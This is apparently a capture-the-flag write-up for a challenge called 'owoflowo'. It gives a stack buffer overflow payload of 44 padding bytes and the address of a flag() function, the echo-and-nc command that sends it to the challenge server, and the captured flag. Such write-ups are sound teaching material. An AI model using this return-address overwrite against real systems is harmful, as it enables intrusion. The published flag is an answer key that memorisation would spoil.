# owoflowo
## Problem Statement

Owo mmy flowo.

## Solution

Payload:

- `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` (offset of 44)
- `\xcb\x85\x04\x08` (address of `flag()`)


```sh
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcb\x85\x04\x08' | nc 0.cloud.chals.io 27049
```

Flag: `flag{0w0_my_fLoWo_my_ow0}`
